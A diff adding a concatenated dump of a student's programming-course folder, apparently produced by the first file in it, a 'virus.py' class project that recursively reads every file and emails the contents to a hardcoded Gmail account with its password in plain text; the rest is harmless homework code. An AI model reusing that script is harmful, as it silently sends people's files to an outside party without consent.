@@ -1,0 +1,327 @@
+/home/dj/Documents/Programming_Languages/Project_1/virus.py
+
+import os
+import smtplib
+from email.mime.text import MIMEText
+
+def list_files(mypath):
+	path_list = []
+	file_list = os.listdir(mypath)
+	for myfile in file_list:
+		full_path = os.path.join(mypath, myfile)
+		if os.path.isfile(full_path) and myfile != "contents.txt":
+			file_out.write(full_path+"\n\n")
+			file_in = open(full_path, "r")
+			while True:
+				character = file_in.read(1)
+				if not character:
+					break
+				file_out.write(character)
+			file_in.close()
+			file_out.write("\n\n======================================================================================================\n\n")
+		elif os.path.isdir(full_path):
+			list_files(full_path)
+	return path_list
+
+#user_path = input("Enter a path:  ")
+user_path = "/home/dj/Documents/Programming_Languages"
+user_file = os.path.join(user_path, 'contents.txt')
+file_out = open(user_file, 'w+')
+list_files(user_path)
+file_out.close()
+
+TO = 'csc113testemail@gmail.com'
+SUBJECT = 'Project 1'
+with open(user_file) as f:
+	TEXT = MIMEText(f.read())
+
+gmail_sender = 'csc113testemail@gmail.com'
+gmail_passwd = 'project1gmail'
+
+server = smtplib.SMTP('smtp.gmail.com', 587)
+server.ehlo()
+server.starttls()
+server.login(gmail_sender, gmail_passwd)
+
+BODY = '\r\n'.join(['To: %s' % TO,
+					'From: %s' % gmail_sender,
+					'Subject: %s' % SUBJECT,
+					'', TEXT])
+
+try:
+	server.sendmail(gmail_sender, [TO], BODY)
+	print ('email sent')
+except:
+	print ('error sending mail')
+
+server.quit()
+
+======================================================================================================
+
+/home/dj/Documents/Programming_Languages/Homework_2/HW2P1.py
+
+def caesar(infile, outfile, shift):
+	file_in = open(infile, "r")
+	file_out = open(outfile, "w")
+	while True:
+		character = file_in.read(1)
+		if not character:
+			break
+		elif 97 <= ord(character.lower()) <= 123:
+			num = ord(character.lower())
+			num += shift - 97
+			new_char = (num%26) + 97
+			file_out.write(chr(new_char))
+	file_in.close()
+	file_out.close()
+
+#caesar("my_file.txt", "out1.txt", 88)
+
+======================================================================================================
+
+/home/dj/Documents/Programming_Languages/Homework_2/my_file.txt
+
+A B c d e f G h i 
+j K L m N o!p q*r$s
+!T(u)v#w@x.y/Z
+
+
+======================================================================================================
+
+/home/dj/Documents/Programming_Languages/Homework_2/out1.txt
+
+klmnopqrstuvwxyzabcdefghij
+
+======================================================================================================
+
+/home/dj/Documents/Programming_Languages/Homework_3/drunk_walk.py
+
+from random import randrange
+
+class DrunkPerson(object):
+	location = 0
+	def __init__(self, id, start):
+		self.id = id
+		self.start = start
+		self.location = 0
+	def move(self, id):
+		distance = randrange(2)
+		if distance == 0:
+			distance = -1
+		self.id = id
+		self.location += distance
+
+DrunkGroup = []
+i = 0
+max_location = 0
+while max_location < 20:
+	max_location = 0
+	DrunkGroup.append(DrunkPerson(i, i))
+	j = 0
+	while j < i:
+		DrunkGroup[j].move(j)
+		print("%i is at %i" % (DrunkGroup[j].id, DrunkGroup[j].location))
+		if DrunkGroup[j].location > max_location:
+			max_location = DrunkGroup[j].location
+		if DrunkGroup[j].location == 20:
+			finisher = DrunkGroup[j].id
+			finisher_start = DrunkGroup[j].start
+			break
+		j += 1
+	i += 1
+
+print("Drunk #%i finished in %i turns. This is a total of %i turns" % (DrunkGroup[j].id, i, i - DrunkGroup[j].start))
+
+======================================================================================================
+
+/home/dj/Documents/Programming_Languages/Homework_3/employee.py
+
+#Employee class definition.
+class Employee:
+    #Class variable (shared by all objects of this class).
+    employee_count = 0
+
+    #Object initialization function.
+    def __init__(self, name, salary):
+        self.name = name
+        self.salary = salary
+        Employee.employee_count += 1
+    
+    #Instance function.
+    def promoted(self, pay_increase):
+        self.salary += pay_increase
+        
+
+
+employee1 = Employee("Jane", 100)
+employee2 = Employee("Jack", 90)
+print("There are %d employees" % Employee.employee_count)
+employee1.promoted(20)
+print("%s is making %d" % (employee1.name, employee1.salary))
+print("%s is making %d" % (employee2.name, employee2.salary))
+
+
+======================================================================================================
+
+/home/dj/Documents/Programming_Languages/Homework_1/HW1P3.py
+
+def my_function(my_list):
+	my_list.sort()
+	results1 = []
+	results2 = []
+	i = 0
+	for element in my_list:
+		if i % 2 != 0:
+			results1.append(element)
+		else:
+			results2.append(element)
+		i += 1
+	results2.reverse()
+	results = results1 + results2
+	return results
+
+for element in random.randint(1, 10)
+	my_list=[4,3,6,7,4,3,9]
+print(my_function(my_list))
+
+======================================================================================================
+
+/home/dj/Documents/Programming_Languages/Homework_1/HW1P2.py
+
+def my_function(w, x, y, z):
+	my_range = range(w, x)
+	result = []
+	for element in my_range:
+		if element**y %z == 0:
+			result.append(element**y)
+	return result
+
+#print(my_function(1,20,2,3))
+#print(my_function(1,20,3,2))
+
+======================================================================================================
+
+/home/dj/Documents/Programming_Languages/Homework_1/HW1P1.py
+
+def palindrome(my_string):
+	lstring = my_string.lower()
+	i = 0
+	j = len(lstring)-1
+	while i<=j:
+		if lstring[i] != lstring[j]:
+			return False
+		i += 1
+		j -= 1
+	return True
+
+#print(palindrome('Rats live on no evil star'))
+#print(palindrome('No ab On'))
+#print(palindrome('abcd efg gfed cba'))
+#print(palindrome('abcdefghijklmnopqrstuvwxyz zyxwvutsrqponmlkjihgfedcba'))
+
+======================================================================================================
+
+/home/dj/Documents/Programming_Languages/Homework_5/calculator.py
+
+from tkinter import Tk, Button, Label, Entry
+
+def add():
+	num1 = first_entry.get()
+	num2 = last_entry.get()
+	if (first_entry.get() == ""):
+		num1 = 0.
+	if (last_entry.get() == ""):
+		num2 = 0.
+	range_label['text'] = str(float(num1) + float(num2))
+
+def sub():
+	num1 = first_entry.get()
+	num2 = last_entry.get()
+	if (first_entry.get() == ""):
+		num1 = 0.
+	if (last_entry.get() == ""):
+		num2 = 0.
+	range_label['text'] = str(float(num1) - float(num2))
+
+def mult():
+	num1 = first_entry.get()
+	num2 = last_entry.get()
+	if (first_entry.get() == ""):
+		num1 = 0.
+	if (last_entry.get() == ""):
+		num2 = 0.
+	range_label['text'] = str(float(num1) * float(num2))
+
+def div():
+	num1 = first_entry.get()
+	num2 = last_entry.get()
+	if (first_entry.get() == ""):
+		num1 = 0.
+	if (last_entry.get() == ""):
+		num2 = 0.
+	range_label['text'] = str(float(num1) / float(num2))
+
+container = Tk()
+
+first_entry = Entry(container)
+first_entry.grid(row=0, columnspan=4)
+
+last_entry = Entry(container)
+last_entry.grid(row=1, columnspan=4)
+
+button = Button(container, text="+", command=add)
+button.grid(row=2, column=0)
+button = Button(container, text="-", command=sub)
+button.grid(row=2, column=1)
+button = Button(container, text="*", command=mult)
+button.grid(row=2, column=2)
+button = Button(container, text="/", command=div)
+button.grid(row=2, column=3)
+
+range_label = Label(container, text="0")
+range_label.grid(row=3, columnspan=4)
+    
+
+
+container.mainloop()
+
+
+======================================================================================================
+
+/home/dj/Documents/Programming_Languages/Homework_4/HW4P1.py
+
+import datetime
+import time
+
+def time_print (date_list):
+	date_list = sorted(date_list)
+	num_items = len(date_list)
+	i=1
+	for date_item in date_list:
+		while datetime.datetime.now() < date_item:
+			time.sleep(1)
+		print ("Datetime " + str(i) + " of " + str(num_items) + " reached.")
+		i+=1
+	print("All dates have been printed")
+
+userdates = [datetime.datetime(2015, 3, 23, 9, 36, 33), datetime.datetime(2015, 3, 23, 9, 36, 55), datetime.datetime(2015, 3, 23, 9, 36, 8)]
+time_print(userdates)
+
+======================================================================================================
+
+/home/dj/Documents/Programming_Languages/Homework_4/HW4P2.py
+
+import datetime
+import time
+
+def wait_inc(x):
+	new_time = datetime.datetime.now() + datetime.timedelta(seconds = x)
+	while datetime.datetime.now() < new_time:
+		time.sleep(1)
+	print ("The system has waited " + str(x) + " seconds.")
+
+x = input("How many seconds should the system wait?  ")
+wait_inc(x)
+
+======================================================================================================
+
